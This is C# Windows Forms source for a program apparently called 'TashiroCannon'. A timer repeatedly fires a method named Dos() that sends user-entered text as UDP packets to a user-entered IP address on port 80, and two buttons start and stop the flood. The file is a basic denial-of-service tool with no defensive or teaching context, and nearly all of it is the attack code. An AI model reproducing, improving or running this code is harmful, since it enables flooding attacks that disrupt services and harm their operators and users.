using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;

namespace TashiroCannon
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Dos();
        }

        public void Dos()
        {
            UdpClient client = new UdpClient();
            IPAddress ip = IPAddress.Parse(iptxt.Text);

            try
            {
                client. Connect(ip,80);
                byte[] sendbytes = Encoding.ASCII.GetBytes(datatxt.Text);
                client.Send(sendbytes, sendbytes.Length);
                client.AllowNatTraversal(true);
                client.DontFragment = true;
            }
            catch
            {
                MessageBox.Show("");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            timer1.Stop();
        }
    }
}
